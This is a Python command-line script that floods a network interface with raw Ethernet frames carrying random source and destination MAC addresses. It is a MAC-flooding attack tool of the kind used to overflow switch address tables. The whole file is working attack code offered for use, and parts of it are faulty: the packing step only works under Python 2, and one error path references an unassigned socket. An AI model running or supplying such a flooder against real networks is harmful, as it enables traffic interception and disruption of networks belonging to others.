from socket import socket, AF_PACKET, SOCK_RAW
from argparse import ArgumentParser
from random import randint
from sys import stderr, exit

def sock_create(intf):
    try:
        sock=socket(AF_PACKET, SOCK_RAW)
        sock.bind((intf, 0))
        print('[!]Socket successfully bound to interface {}'.format(intf))
        return sock
    except Exception as e:
        stderr.write('[-]Error in binding the socket at {}: {}\nExiting...\n'.format(intf, e))
        if sock!=None:
            sock.close()
        exit(-1)

def rand_mac():
    mac=[]
    for i in range(6):
        mac.append(randint(0x00, 0xff))
    return mac

def pack(pkt):
    return b"".join(map(chr, pkt))

def form_pkt():
    dst_mac=rand_mac()
    src_mac=rand_mac()
    typ=[0x08, 0x00]
    return pack(dst_mac+src_mac+typ)

def flood(sock, num):
    try:
        for i in range(num):
            pkt=form_pkt()
            sock.send(pkt)
    except Exception as e:
        stderr.write('[-]Error in sending packet num {}: {}'.format(i, e))
        exit(-1)

if __name__=='__main__':
    parser=ArgumentParser()
    parser.add_argument('-i', '--intf', required=True, metavar='', dest='intf', help='The interface to bind the socket to')
    parser.add_argument('-n', '--num', required=True, type=int, metavar='', dest='num', help='The number of packets to send')
    args=parser.parse_args()

    #create socket
    sock=sock_create(args.intf)
    
    #flood
    flood(sock, args.num)
